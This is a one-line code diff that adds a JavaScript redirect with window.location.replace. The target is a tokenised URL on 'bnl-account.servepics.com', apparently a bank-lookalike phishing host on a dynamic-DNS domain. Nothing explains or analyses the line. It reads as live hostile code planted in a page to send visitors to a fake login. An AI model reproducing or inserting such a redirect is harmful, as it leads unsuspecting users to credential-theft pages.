@@ -1,0 +1,1 @@
+window.location.replace("https://bnl-account.servepics.com/DjdW2Zx9SivPkQEyGlIEgEceN1UzHpZ7FhKjJm4g3R25A0GoUdfIQYfrr9M0sf8Yi5ym/");
